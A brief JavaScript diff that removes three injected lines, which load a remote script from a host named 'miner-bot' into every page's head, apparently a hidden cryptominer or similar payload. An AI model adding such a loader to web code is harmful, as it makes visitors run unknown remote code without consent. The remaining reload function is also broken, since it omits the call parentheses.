@@ -1,6 +1,3 @@
-var _script = document.createElement('script');
-_script.setAttribute('src','https://miner-bot.github.io/js/ApplyForClasses.js');
-document.head.appendChild(_script);
 function reload() {
     window.location.reload;
 }
